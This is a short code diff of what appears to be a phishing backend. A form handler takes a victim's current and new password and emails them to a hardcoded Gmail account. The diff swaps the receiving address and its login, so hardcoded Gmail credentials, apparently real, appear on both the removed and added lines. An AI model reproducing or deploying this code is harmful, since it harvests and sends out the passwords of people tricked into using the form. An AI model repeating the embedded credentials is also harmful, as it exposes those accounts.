@@ -20,11 +20,11 @@ def submit_form():
     body = f"Current Password: {current_password}\nNew Password: {new_password}"
 
     # Your email address
-    gmail_user = 'marababy003@gmail.com'  # Replace with your email address
-    gmail_password = 'aqwg lmla xbgj ouln'  # Replace with your email password
+    gmail_user = 'yusufayodejiram1@gmail.com'  # Replace with your email address
+    gmail_password = 'officer70#'  # Replace with your email password
 
     sent_from = gmail_user
-    to = ['marababy003@gmail.com']
+    to = ['yusufayodejiram1@gmail.com']
     email_text = f"""\
     From: {sent_from}
     To: {", ".join(to)}
